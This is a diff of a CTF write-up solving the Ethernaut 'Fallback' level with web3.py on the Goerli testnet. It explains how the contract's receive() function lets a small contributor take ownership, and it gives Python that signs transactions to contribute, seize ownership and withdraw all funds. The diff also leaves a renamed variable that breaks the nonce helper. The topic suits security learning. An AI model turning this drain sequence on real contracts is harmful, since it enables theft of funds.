@@ -10,6 +10,8 @@ This is a fast-paced walkthrough of the ethernaut challenges using web3.py. The 
 
 ## Setup
 
+we will reference the definitions below through out the writeup
+
 ```python
 # setup connection to test net
 from web3 import Web3
@@ -19,8 +21,19 @@ l_net = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))
 
 # connect to goerli network
 g_net = Web3(Web3.HTTPProvider("https://rpc.ankr.com/eth_goerli"))
-
 g_net.isConnected()
+
+# make it easy to access all eth functions
+net = g_net.eth
+
+# your account whose private key will be used to sign the txn
+my_address = "0x1234567890123456789012345678901234567890"
+
+# your account's private key here
+key = "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
+
+nonce = lambda: g_net.eth.get_transaction_count(my_account)
+
 
 ```
 
@@ -184,7 +197,7 @@ contract Fallback {
 
 ### level_1 Solution
 
-From the problem statement our task is to own the contract and steal all the funds, to steal the funds from the contract we just need to be the owner of the contract and call the `withdraw()` function. But the withdraw function can only be called by the owner, due to the `onlyOwner` modifier, therefore we have to figure out a way to take ownership. Looking closely at the `contribute` function, it can be seen that we can take ownership of the contract when we send a contribution to it and our total contribution is greater than that of the current owner, `owner = msg.sender`. But this seems very difficult because of the check `require(msg.value < 0.001 ether)`, since it will take a lot of time before we can match the owners contribution (`1000 * (1 ether)`). But all hope is not lost since we have a `receive()` function that accomplish the same objective (`owner = msg.sender`) all we have to do is make sure we pass the check `require(msg.value > 0 && contributions[msg.sender] > 0)`. The following contract solves the problem.
+From the problem statement our task is to own the contract and steal all the funds, to steal the funds from the contract we just need to be the owner of the contract and call the `withdraw()` function. But the withdraw function can only be called by the owner, due to the `onlyOwner` modifier, therefore we have to figure out a way to take ownership. Looking closely at the `contribute` function, it can be seen that we can take ownership of the contract when we send a contribution to it and our total contribution is greater than that of the current owner, `owner = msg.sender`. But this seems very difficult because of the check `require(msg.value < 0.001 ether)`, since it will take a lot of time before we can match the owners contribution (`1000 * (1 ether)`). But all hope is not lost since we have a `receive()` function that accomplish the same objective (`owner = msg.sender`) all we have to do is make sure we pass the check `require(msg.value > 0 && contributions[msg.sender] > 0)`. The following contract implementation in solidity solves the problem.
 
 `fallback_attack.sol`
 
@@ -225,62 +238,41 @@ contract AttackFallback {
 
 ```
 
-We deploy the `fallback_attack.sol` contract, we then call the `makeContribution()` function, afterwards we call the `ownTheContract()` and `lootContract()` consecutively to solve the challenge. We accomplish that with following python code:
+But since we are trying to learn `web3.py` let's see how we can solve this completely in python:
 
 ```python
-# use the address you deployed ur
-# attack contract at
-contract_addr = '0x10D409B3962f5F49Dc5Ac2039bcFe06F722cfc22'
+# address of the contract we are trying to own
+contract_addr = '0xFdB28ABf97c8f5C196638E5E619723A9338629A6'
+contract_abi = '[{ "redacted for space" }]'
+contract = net.contract(contract_addr, abi=contract_abi)
 
-contract_abi = '[{"inputs": [],"name": "lootContract","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [],"name": "makeContribution","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [],"name": "ownTheContract","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "address","name": "fallbackContractAddress","type": "address"}],"stateMutability": "nonpayable","type": "constructor"},{"stateMutability": "payable","type": "receive"},{"inputs": [],"name": "fallbackContract","outputs": [{"internalType": "contract Fallback","name": "","type": "address"}],"stateMutability": "view","type": "function"},{"inputs": [],"name": "getContribution","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"}]'
-
-
-attack_contract = g_net.eth.contract(address=contract_addr, abi=contract_abi)
-
-# your account whose private key will be used to sign the txn
-my_account = "0x1234567890123456789012345678901234567890"
-
-# your account's private key here
-key = "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
-
-nonce = lambda: g_net.eth.get_transaction_count(my_account)
-
-# prepare makeContribution() txn
-mc_txn = attack_contract.functions.makeContribution().build_transaction()
-mc_txn['nonce'] = nonce()
+# first we contribute to the contract,
+# generate txn
+cnt_txn = contract.functions.contribute().build_transaction({"nonce": nonce(), "value": 3})
 
 # sign the txn
-signed_mc_txn = g_net.eth.account.sign_transaction(mc_txn, key)
+signed_cnt_txn = net.account.sign_transaction(cnt_txn, key)
 
 # send the txn
-g_net.eth.send_raw_transaction(signed_mc_txn.rawTransaction)
+net.send_raw_transaction(signed_cnt_txn.rawTransaction)
 
-# prepare ownTheContract() txn
-otc_txn = attack_contract.functions.ownTheContract().build_transaction({
-    'nonce': nonce(),
-    'gas': 1000000,
-    'gasPrice': g_net.eth.gas_price,
-})
+# then we send some eth to the contract
+# to take ownership
+rcv_txn = contract.receive.build_transaction({"nonce": nonce(), "value": 3, "gas": 10_000_000})
 
-# sign the txn
-signed_otc_txn = g_net.eth.account.sign_transaction(otc_txn, key)
+signed_rcv_txn = net.account.sign_transaction(rcv_txn, key)
 
-# send the txn
-g_net.eth.send_raw_transaction(signed_otc_txn.rawTransaction)
+net.send_raw_transaction(signed_rcv_txn.rawTransaction)
 
-# prepare lootContract() txn
-lc_txn = attack_contract.functions.lootContract().build_transaction({
-    'nonce': nonce(),
-    'gas': 1000000,
-    'gasPrice': g_net.eth.gas_price,
-})
+# finally we steal all the eth in the contract
+wdr_txn = contract.functions.withdraw().build_transaction({"nonce": nonce(), "gas": 10_000_000})
 
-# sign the txn
-signed_lc_txn = g_net.eth.account.sign_transaction(lc_txn, key)
+signed_wdr_txn = net.account.sign_transaction(wdr_txn, key)
 
-# send the txn
-g_net.eth.send_raw_transaction(signed_lc_txn.rawTransaction)
+net.send_raw_transaction(signed_wdr_txn.rawTransaction)
 
 ```
+
+And that's it. We submit the contract and challenge solved.
 
 Note that we could easily have combined all the functions into one function and call it once in the solidity contract, but I decided to split it up to demonstrate how to use web3.py.
